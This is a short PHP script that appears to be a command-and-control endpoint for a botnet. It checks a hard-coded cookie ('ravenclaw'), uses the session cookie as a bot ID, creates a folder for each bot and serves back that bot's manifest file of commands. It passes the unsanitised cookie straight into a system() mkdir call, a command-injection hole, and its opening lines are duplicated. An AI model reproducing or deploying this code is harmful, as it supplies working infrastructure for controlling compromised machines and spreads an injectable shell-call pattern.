<?php
$logdir = "log/";

$id = $_COOKIE["phpsessid"];
$logdir = "log/";

$id = $_COOKIE["phpsessid"];
$auth = $_COOKIE["uid"];

$bot_manifest = $logdir . $id . "/manifest.txt";

//AUTH CHECK
if ($auth == "ravenclaw"){
//CHECK IF BOT RECORD EXISTS
if (file_exists($bot_manifest))
{
   echo "";
}
else
{
   system("mkdir " . $logdir . $id);
   //$response = fopen($bot_manifest, "w");
   //$fest = "$id";
   //fwrite($response, $id);
   //fclose($response);
}

$cmd = file_get_contents($bot_manifest, true);
echo $cmd;

}//END AUTH CHECK
?>

